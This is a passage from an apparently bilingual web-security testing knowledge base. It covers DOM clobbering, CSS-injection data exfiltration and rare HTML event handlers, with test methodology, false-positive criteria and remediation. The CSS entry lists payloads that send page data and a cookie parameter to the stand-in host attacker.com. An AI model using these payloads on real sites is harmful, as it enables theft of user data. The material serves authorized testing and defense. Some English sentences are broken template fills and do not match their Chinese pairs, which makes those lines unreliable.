prerequisites.en: After attacker HTML insertion, the application reads configuration, URLs, or objects through window or document named properties that are not fixed by lexical or module scope.

prerequisites.zh: 已对目标属性解析和消费点加入跟踪，测试节点只提供无害固定值，并记录插入前后的属性描述符和浏览器版本。
prerequisites.en: Target property resolution and consumption are traced, test nodes provide only harmless fixed values, and property descriptors before and after insertion plus browser version are recorded.

title.zh: DOM变量覆盖攻击

execution.command: alert

description.zh: DOM变量覆盖攻击包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: DOM Clobbering contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是命名元素覆盖应用预期引用，使真实消费点读取攻击者节点/值并进入固定 marker 分支；DOM 节点、属性解析和消费调用栈必须关联。 假阳性边界：页面中存在相同 id/name、DevTools 显示 window 属性、目标使用局部变量/模块绑定、浏览器不支持该命名规则或值未被消费均不是可利用 clobbering。
analysis.en: Positive evidence requires a named element to override the expected application reference so the real consumer reads the attacker node or value and enters a fixed-marker branch, correlating DOM node, property resolution, and consumer call stack. False-positive boundary: A matching id or name, a window property shown in Dev Tools, use of a local or module binding, unsupported named-property behavior, or a value never consumed is not exploitable clobbering.

opsecTips.zh: DOM Clobbering 测试只覆盖无害配置值；若影响认证、表单目标、脚本 URL、全局原型或非测试页面逻辑，立即停止。
opsecTips.en: DOM Clobbering testing overrides harmless configuration values only; stop if authentication, form targets, script URLs, global prototypes, or non-test page logic is affected.

opsecTips.zh: 移除命名节点，恢复全局属性/配置对象与 instrumentation，重载页面清空命名属性缓存，并验证原引用类型和值。
opsecTips.en: Remove named nodes, restore global properties, configuration objects, and instrumentation, reload to clear named-property state, and verify original reference types and values.

title.zh: 记录“DOM Clobbering 命名属性覆盖”预期对象
title.en: Scope the DOM Clobbering Named-Property Override data flow

description.zh: 在未注入页面记录目标属性的类型、所有权与调用位置，并确认前提“应用依赖 window.foo、document.foo 或隐式全局变量，允许不可信 HTML 设置 id/name，并未验证取回值的类型和所有权”。
description.en: Trace the real input to the final sink or policy decision, confirm that the application relies on window.foo, document.foo, or implicit globals, permits untrusted HTML with id or name, and does not validate the retrieved value's type and ownership, and record browser, response-header, and relevant component versions.

title.zh: 注入“DOM 命名属性覆盖”冲突节点
title.en: Establish the DOM Named-Property Clobbering baseline

description.zh: 逐个使用原始 id/name 结构观察属性解析变化；创建同名元素本身不作为漏洞证据。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the before-and-after object types, property resolution path, and downstream control-flow difference are reproducible in the debugger; creating a same-name element alone is not exploitation as valid evidence.

attackChain.payload: alert

title.zh: 跟踪覆盖后的控制流
title.en: Run a single-variable DOM Clobbering Named-Property Override check

description.zh: 先记录目标全局属性的预期类型，再注入原集合中的同名元素并单步执行读取点；只有值进入 URL、HTML 或代码 sink 才扩展影响验证；只有可控值继续进入危险 sink，并满足“覆盖前后对象类型、属性解析路径与后续控制流差异可以在调试器中复现；仅创建同名元素不等于可利用”时才确认影响。
description.en: record the expected type of the target global property, inject same-name elements from the original set, step through the read, and extend impact testing only when the value reaches a URL, HTML, or code sink; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 改用显式查询并回归
title.en: Retest the DOM Clobbering Named-Property Override remediation boundary

description.zh: 避免隐式全局和命名属性访问，使用模块局部变量与显式 getElementById，并验证对象类型；消毒 id/name 冲突并通过 CSP/Trusted Types 约束后续 sink；重放合法节点和冲突节点，确认组件功能保留且安全对象不再被命名属性替换。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the before-and-after object types, property resolution path, and downstream control-flow difference are reproducible in the debugger; creating a same-name element alone is not exploitation no longer appears.

overview.zh: DOM Clobbering 命名属性覆盖检查浏览器命名属性访问。需要验证的行为为：浏览器命名属性访问是否让注入元素替代代码期望的普通对象、配置字段或函数引用，并进一步影响危险 sink。成立前提为：应用依赖 window.foo、document.foo 或隐式全局变量，允许不可信 HTML 设置 id/name，并未验证取回值的类型和所有权。判定标准为：覆盖前后对象类型、属性解析路径与后续控制流差异可以在调试器中复现；仅创建同名元素不等于可利用。仅创建同名元素只能证明发生名称冲突，不能证明控制流或危险 sink 已被改变。
overview.en: DOM Clobbering Named-Property Override checks whether browser named-property access lets injected elements replace ordinary objects, configuration fields, or function references expected by code and then influence a dangerous sink. It applies when the application relies on window.foo, document.foo, or implicit globals, permits untrusted HTML with id or name, and does not validate the retrieved value's type and ownership. A conclusion requires the before-and-after object types, property resolution path, and downstream control-flow difference are reproducible in the debugger; creating a same-name element alone is not exploitation; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 命名属性覆盖的前提为：应用依赖 window.foo、document.foo 或隐式全局变量，允许不可信 HTML 设置 id/name，并未验证取回值的类型和所有权。审计必须跟踪“浏览器命名属性访问是否让注入元素替代代码期望的普通对象、配置字段或函数引用，并进一步影响危险 sink”涉及的属性类型、所有权与后续使用点。只有类型变化和控制流影响连续可见时，才可从 id/name 冲突进一步判断安全影响。
vulnerability.en: The risk exists when the application relies on window.foo, document.foo, or implicit globals, permits untrusted HTML with id or name, and does not validate the retrieved value's type and ownership, allowing whether browser named-property access lets injected elements replace ordinary objects, configuration fields, or function references expected by code and then influence a dangerous sink. Review the input source, final parsing context, browser or policy version, and the before-and-after object types, property resolution path, and downstream control-flow difference are reproducible in the debugger; creating a same-name element alone is not exploitation; otherwise record only an unconfirmed control differential.

exploitation.zh: 先记录目标全局属性的预期类型，再注入原集合中的同名元素并单步执行读取点；只有值进入 URL、HTML 或代码 sink 才扩展影响验证。先记录目标属性的预期类型与所有权，再逐个注入同名元素并单步观察解析和后续分支；仅当可控值到达 URL、HTML 或代码 sink 时继续验证，并按“覆盖前后对象类型、属性解析路径与后续控制流差异可以在调试器中复现；仅创建同名元素不等于可利用”确认结果。
exploitation.en: In an authorized isolated environment, record the expected type of the target global property, inject same-name elements from the original set, step through the read, and extend impact testing only when the value reaches a URL, HTML, or code sink. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 避免隐式全局和命名属性访问，使用模块局部变量与显式 getElementById，并验证对象类型；消毒 id/name 冲突并通过 CSP/Trusted Types 约束后续 sink。重放合法 DOM 标识和冲突样例，确认显式查询与类型检查保留正常组件行为，同时命名属性不再覆盖配置对象、函数或安全决策。
mitigation.en: Remediation should avoid implicit globals and named-property access, use module-local variables and explicit get Element By Id with type checks, sanitize id or name conflicts, and constrain downstream sinks with CSP and Trusted Types. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: CSS 注入属性匹配外带

description.zh: 通过属性选择器、@import、外部样式与 background URL 验证 CSS 注入能否产生可观察网络请求；不将静态外连自动等同敏感数据泄露。
description.en: Uses attribute selectors, @import, external styles, and background URLs to test whether CSS injection causes observable requests without equating static outbound traffic with sensitive-data exfiltration.

prerequisites.zh: 攻击者可控 CSS 会应用到含合成测试属性值的目标 DOM，浏览器允许对应选择器和 URL 加载，且不使用真实秘密。
prerequisites.en: Attacker-controlled CSS applies to target DOM containing a synthetic test attribute, the browser permits the selectors and URL loads, and no real secret is used.

prerequisites.zh: 每条条件规则使用自有唯一 URL 令牌，同时配置不匹配属性、无 CSS 和无条件 @import/link 对照以区分普通外连。
prerequisites.en: Each conditional rule uses an owned unique URL token, with nonmatching-attribute, no-CSS, and unconditional import or link controls to distinguish ordinary egress.

title.zh: CSS注入数据外带

execution.command:
<style>input[value^="a"] { background: url(https://attacker.com/leak?a); }</style>
<style>@import url(https://attacker.com/leak);</style>
<link rel=stylesheet href="https://attacker.com/leak">
<style>body { background: url(https://attacker.com/leak?cookie=); }</style>

description.zh: CSS注入数据外带包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: CSS Injection Data Exfiltration contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是只有与合成属性匹配的选择器触发对应令牌请求，并在负对照中消失；无条件 @import/link 只证明 CSS/HTML 外连能力。 假阳性边界：任意 background/@import/link 请求、缓存预取、安全扫描器访问、页面原有 CSS 或无法与具体属性值关联的流量都不能证明敏感数据泄露。
analysis.en: Positive evidence requires only the selector matching the synthetic attribute to trigger its token request and disappear in negative controls; unconditional import or link proves CSS or HTML egress only. False-positive boundary: Any background, import, or link request, cache prefetch, scanner access, existing page CSS, or traffic not tied to a specific attribute value does not prove sensitive-data exfiltration.

opsecTips.zh: CSS 属性匹配测试只使用一个合成字符和值，禁止读取真实 token、密码或表单；出现非测试数据、第三方请求或请求爆发时停止。
opsecTips.en: CSS attribute-match testing uses one synthetic character and value only and never reads real tokens, passwords, or forms; stop on non-test data, third-party requests, or request bursts.

opsecTips.zh: 删除注入 style/link 与合成属性，清理 CSS、字体、浏览器和 CDN 缓存，停用监听端点并按令牌删除请求日志。
opsecTips.en: Remove injected style or link nodes and synthetic attributes, clear CSS, font, browser, and CDN caches, disable listeners, and delete request logs by token.

title.zh: 界定“CSS 注入属性匹配外带”可控样式范围
title.en: Scope the CSS Injection Attribute-Match Exfiltration data flow

description.zh: 确认前提“应用允许 style、link 或外部样式输入，敏感值存在于 CSS 可匹配的 DOM 属性或可渲染文本中，并允许向外部域加载资源”，记录样式作用域、敏感 DOM 隔离、CSP 资源指令和缓存状态。
description.en: Trace the real input to the final sink or policy decision, confirm that the application accepts style, link, or external stylesheet input, a sensitive value is present in CSS-matchable DOM attributes or rendered text, and external resource loading is permitted, and record browser, response-header, and relevant component versions.

title.zh: 建立“CSS 注入与数据外带”外连基线
title.en: Establish the CSS Injection and Data Exfiltration baseline

description.zh: 先用无条件测试资源确认网络可观察性，再放置已知哨兵值，并按“只有与预置测试值相对应的条件请求序列才能证明推断能力；无条件 @import 或 background 请求仅证明 CSS 外连”判断条件命中。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only only a conditional request sequence matching a planted test value proves inference; an unconditional @import or background request proves only CSS-originated egress as valid evidence.

title.zh: 逐条件重放“CSS 注入属性匹配外带”
title.en: Run a single-variable CSS Injection Attribute-Match Exfiltration check

description.zh: 在隔离页面放置非敏感哨兵属性，先测试无条件资源加载，再按单字符前缀规则观察选择性请求；不接触真实令牌或用户字段；每轮清理缓存并只启用一个字符或属性条件，不接触真实用户数据。
description.en: place a non-sensitive sentinel attribute in an isolated page, establish unconditional resource loading, then observe conditional requests from one-character prefix rules without touching real tokens or user fields; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<style>input[value^="a"] { background: url(https://attacker.com/leak?a); }</style>
<style>@import url(https://attacker.com/leak);</style>
<link rel=stylesheet href="https://attacker.com/leak">
<style>body { background: url(https://attacker.com/leak?cookie=); }</style>

title.zh: 阻断样式外带并复测
title.en: Retest the CSS Injection Attribute-Match Exfiltration remediation boundary

description.zh: 禁止不可信 CSS、style 和任意外部样式 URL，使用严格 HTML/CSS 消毒；通过 CSP style-src、img-src、font-src 与出口域允许列表阻断外带；验证合法主题仍可用，同时条件选择器或字体规则无法向非允许域发送请求。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while only a conditional request sequence matching a planted test value proves inference; an unconditional @import or background request proves only CSS-originated egress no longer appears.

overview.zh: CSS 注入属性匹配外带属于 CSS 条件资源加载侧信道。验证目标为：攻击者控制的 CSS 是否能根据 DOM 属性或字符匹配条件选择性加载远程资源，从请求标记推断页面中的受保护值。该测试要求：应用允许 style、link 或外部样式输入，敏感值存在于 CSS 可匹配的 DOM 属性或可渲染文本中，并允许向外部域加载资源。有效证据标准为：只有与预置测试值相对应的条件请求序列才能证明推断能力；无条件 @import 或 background 请求仅证明 CSS 外连。无条件字体、图片或样式请求只能证明存在外连，不能证明敏感值已被推断。
overview.en: CSS Injection Attribute-Match Exfiltration checks whether attacker-controlled CSS can conditionally load a remote resource based on DOM attribute or character matches and reveal protected page values through request markers. It applies when the application accepts style, link, or external stylesheet input, a sensitive value is present in CSS-matchable DOM attributes or rendered text, and external resource loading is permitted. A conclusion requires only a conditional request sequence matching a planted test value proves inference; an unconditional @import or background request proves only CSS-originated egress; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 侧信道成立的前提为：应用允许 style、link 或外部样式输入，敏感值存在于 CSS 可匹配的 DOM 属性或可渲染文本中，并允许向外部域加载资源。审计围绕“攻击者控制的 CSS 是否能根据 DOM 属性或字符匹配条件选择性加载远程资源，从请求标记推断页面中的受保护值”使用预置的非敏感哨兵值，并严格控制缓存、预加载和字体回退。否则，网络请求与字符或属性条件之间无法建立可靠因果关系。
vulnerability.en: The risk exists when the application accepts style, link, or external stylesheet input, a sensitive value is present in CSS-matchable DOM attributes or rendered text, and external resource loading is permitted, allowing whether attacker-controlled CSS can conditionally load a remote resource based on DOM attribute or character matches and reveal protected page values through request markers. Review the input source, final parsing context, browser or policy version, and only a conditional request sequence matching a planted test value proves inference; an unconditional @import or background request proves only CSS-originated egress; otherwise record only an unconfirmed control differential.

exploitation.zh: 在隔离页面放置非敏感哨兵属性，先测试无条件资源加载，再按单字符前缀规则观察选择性请求；不接触真实令牌或用户字段。先建立无条件资源加载基线，再逐个启用字符或属性条件；每轮清理缓存并记录 Initiator、请求 URL 与已知哨兵值，最终按“只有与预置测试值相对应的条件请求序列才能证明推断能力；无条件 @import 或 background 请求仅证明 CSS 外连”判断条件侧信道是否可重复。
exploitation.en: In an authorized isolated environment, place a non-sensitive sentinel attribute in an isolated page, establish unconditional resource loading, then observe conditional requests from one-character prefix rules without touching real tokens or user fields. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 禁止不可信 CSS、style 和任意外部样式 URL，使用严格 HTML/CSS 消毒；通过 CSP style-src、img-src、font-src 与出口域允许列表阻断外带。回归分别覆盖合法主题样式、受控字体和原条件规则，确认业务样式仍可加载，而用户样式无法接触敏感 DOM，也不能向非允许域发送选择性请求。
mitigation.en: Remediation should disallow untrusted CSS, style elements, and arbitrary stylesheet URLs, sanitize HTML and CSS strictly, and block egress with CSP style-src, img-src, font-src, and destination allowlists. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: 低频 HTML 事件处理器变体

description.zh: 覆盖 marquee、iframe、object、embed、link 与 style 等较少见的加载事件，验证元素支持、资源状态和浏览器差异下的事件属性执行。
description.en: Covers less-common load events on marquee, iframe, object, embed, link, and style to test execution under element support, resource state, and browser differences.

prerequisites.zh: 目标浏览器/版本确实支持待测 marquee、iframe、object、embed、link 或 style 元素事件，并能控制资源加载/失败条件。
